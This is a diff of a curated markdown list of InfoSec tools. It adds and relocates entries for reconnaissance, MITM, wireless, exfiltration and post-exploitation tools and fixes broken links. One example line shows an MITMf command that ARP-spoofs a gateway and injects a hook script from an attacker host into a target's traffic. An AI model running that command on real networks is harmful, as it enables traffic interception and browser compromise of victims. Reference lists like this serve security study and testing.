@@ -668,6 +668,7 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
 * [Dnsrecon](https://github.com/darkoperator/dnsrecon/) - DNS enumeration script.
 * [Dnstracer](http://www.mavetju.org/unix/dnstracer.php) - Determines where a given DNS server gets its information from, and follows the chain of DNS servers.
 * [Dork-cli](https://github.com/jgor/dork-cli) - Command line Google dork tool.
+* [emagnet](https://github.com/wuseman/EMAGNET) - Automated hacking tool that will find leaked databases.
 * [FindFrontableDomains](https://github.com/rvrsh3ll/FindFrontableDomains) - Multithreaded tool for finding frontable domains.
 * [GOSINT](https://github.com/Nhoya/gOSINT) - OSINT tool with multiple modules and a telegram scraper.
 * [Github-dorks](https://github.com/techgaun/github-dorks) - CLI tool to scan github repos/organizations for potential sensitive information leak.
@@ -1247,6 +1248,9 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
 * [Pentest-Tools](https://pentest-tools.com/home) - Online suite of various different pentest related tools.
 * [Ruler](https://github.com/sensepost/ruler) - Tool for remotely interacting with Exchange servers.
 * [Shodan](https://www.shodan.io/) - Database containing information on all accessible domains on the internet obtained from passive scanning.
+* [Spyse](https://spyse.com/) - Web research services that scan the entire internet using OSINT, to simplify the investigation of infrastructure and attack surfaces.
+* [Spyse.py](https://github.com/zeropwn/spyse.py) - Python API wrapper and command-line client for the tools hosted on spyse.com.
+* [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomain enumeration tool for penetration testers.
 * [ldapsearch](https://linux.die.net/man/1/ldapsearch) - Linux command line utility for querying LDAP servers.
 * [nmap](https://nmap.org/) - Free security scanner for network exploration & security audits.
 * [pyShodan](https://github.com/GoVanguard/pyShodan) - Python 3 script for interacting with Shodan API (requires valid API key).
@@ -1344,6 +1348,8 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
   * [scapy](https://github.com/secdev/scapy) - Python-based interactive packet manipulation program & library.
   * [Sockstress](https://github.com/defuse/sockstress) - TCP based DoS utility.
   * [SPARTA](https://sparta.secforce.com/) - Graphical interface offering scriptable, configurable access to existing network infrastructure scanning and enumeration tools.
+  * [Spyse](https://spyse.com/) - Web research services that scan the entire internet using OSINT, to simplify the investigation of infrastructure and attack surfaces.
+  * [Spyse.py](https://github.com/zeropwn/spyse.py) - Python API wrapper and command-line client for the tools hosted on spyse.com.
   * [THC Hydra](https://github.com/vanhauser-thc/thc-hydra) - Online password cracking tool with built-in support for many network protocols, including HTTP, SMB, FTP, telnet, ICQ, MySQL, LDAP, IMAP, VNC, and more.
   * [UFONet](https://github.com/epsylon/ufonet/) - Layer 7 DDoS/DoS tool.
   * [Zarp](https://github.com/hatRiot/zarp/) - Multipurpose network attack tool, both wired and wireless.
@@ -1358,12 +1364,13 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
   * [Chaosreader](http://chaosreader.sourceforge.net/) - Universal TCP/UDP snarfing tool that dumps session data from various protocols.
 
 #### Proxies and MITM Tools
-    - e.g. `mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --targets 192.168.1.20 --inject --js-url http://192.168.1.137:3000/hook.js`
   * [BetterCAP](https://www.bettercap.org/) - Modular, portable and easily extensible MITM framework.
   * [dnschef](https://github.com/iphelix/dnschef) - Highly configurable DNS proxy for pentesters.
   * [Ettercap](https://www.ettercap-project.org/) - Comprehensive, mature suite for machine-in-the-middle attacks.
   * [evilgrade](https://github.com/infobyte/evilgrade) - Modular framework to take advantage of poor upgrade implementations by injecting fake updates.
+  * [mallory](https://github.com/justmao945/mallory) - HTTP/HTTPS proxy over SSH
   * [MITMf](https://github.com/byt3bl33d3r/MITMf) - Multipurpose man-in-the-middle framework.
+    - e.g. `mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --targets 192.168.1.20 --inject --js-url http://192.168.1.137:3000/hook.js`
   * [mitmproxy](https://github.com/mitmproxy/mitmproxy) - Interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers.
   * [Morpheus](https://github.com/r00t-3xp10it/morpheus) - Automated ettercap TCP/IP Hijacking tool.
   * [Responder-Windows](https://github.com/lgandx/Responder-Windows) - Windows version of the above NBT-NS/LLMNR/MDNS poisoner.
@@ -1372,6 +1379,7 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
 
 #### Wireless Network Tools
   * [Aircrack-ng](https://www.aircrack-ng.org/) - Set of tools for auditing wireless networks.
+  * [BetterCAP](https://www.bettercap.org/) - Wifi, Bluetooth LE, and HID reconnaissance and MITM attack framework, written in Go.
   * [Fluxion](https://github.com/FluxionNetwork/fluxion) - Suite of automated social engineering based WPA attacks.
   * [Kismet](https://www.patreon.com/kismetwireless) - Wireless network discovery tool.
   * [MANA Toolkit](https://github.com/sensepost/mana) - Rogue AP and man-in-the-middle utility.
@@ -1422,6 +1430,7 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
   * [mimikittenz](https://github.com/orlyjamie/mimikittenz) - Post-exploitation PowerShell tool for extracting data from process memory.
   * [PANHunt](https://github.com/Dionach/PANhunt) - Search file systems for credit cards.
   * [PassHunt](https://github.com/Dionach/PassHunt) - Search file systems for passwords.
+  * [ptunnel-ng](https://github.com/lnslbrty/ptunnel-ng) - Tunnel IPv4 traffic through ICMP pings; slow but stealthy when normal IP exfiltration traffic is blocked.
   * [pwnat](https://github.com/samyk/pwnat) - Punches holes in firewalls and NATs.
   * [spYDyishai](https://github.com/Night46/spYDyishai/) - Local Google credentials exfiltration tool, written in Python.
   * [tgcd](http://tgcd.sourceforge.net/) - Simple Unix network utility to extend the accessibility of TCP/IP based network services beyond firewalls.
@@ -1514,11 +1523,12 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
 
 #### GNU Linux Utilities
   * [Linus](https://cisofy.com/lynis/) - Security auditing tool for Linux and macOS.
-  * [Linux Exploit Suggester](hhttps://github.com/InteliSecureLabs/Linux_Exploit_Suggester) - Heuristic reporting on potentially viable exploits for a given GNU/Linux system.
+  * [Linux Exploit Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) - Heuristic reporting on potentially viable exploits for a given GNU/Linux system.
   * [Mempodipper](https://www.exploit-db.com/exploits/18411/) - Linux Kernel 2.6.39 < 3.2.2 local privilege escalation script.
   * [vuls](https://github.com/future-architect/vuls) - Linux/FreeBSD agentless vulnerability scanner.
 
 #### macOS Utilities
+  * [Bella](https://github.com/khaleds-brain/Bella) - Bella is a pure python post-exploitation data mining tool & remote administration tool for macOS.
   * [Linus](https://cisofy.com/lynis/) - Security auditing tool for Linux and macOS.
 
 #### Social Engineering Tools
@@ -1533,7 +1543,7 @@ If you're new to InfoSec and are looking for a concentrated list of resources to
   * [wifiphisher](https://github.com/wifiphisher/wifiphisher) - Automated phishing attacks against Wi-Fi networks
   
 #### Anonymity Tools
-  * [Freenet] (https://freenetproject.org/) - Freenet is a peer-to-peer platform for censorship-resistant communication and publishing.
+  * [Freenet](https://freenetproject.org/) - Freenet is a peer-to-peer platform for censorship-resistant communication and publishing.
   * [I2P](https://geti2p.net/en/) - The Invisible Internet Project.
   * [OnionScan](https://onionscan.org/) - Tool for investigating the Dark Web by finding operational security issues introduced by Tor hidden service operators.
   * [Tor](https://www.torproject.org/) - Free software and onion routed overlay network that helps you defend against traffic analysis.
